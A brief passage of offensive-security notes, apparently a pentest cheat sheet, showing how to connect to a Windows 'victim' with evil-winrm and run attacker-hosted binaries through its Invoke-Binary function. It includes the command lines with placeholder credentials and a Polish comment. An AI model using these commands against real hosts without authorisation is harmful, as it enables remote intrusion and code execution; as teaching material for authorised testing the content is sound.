To execute binaries from our attacker machine we need to use evil-winrm’s custom built-in **Invoke-Binary** function.
```powershell
$ evil-winrm -u <user> -p <passwd> -i <IP> -e /usr/share/windows-resources -s /usr/share/windows-resources
# nawiązanie połączenia z ofiaą za pomocą evil-winrm
(*evil-winrm*) PS> menu
(*evil-winrm*) PS> Invoke-Binary /usr/share/windows-resources
```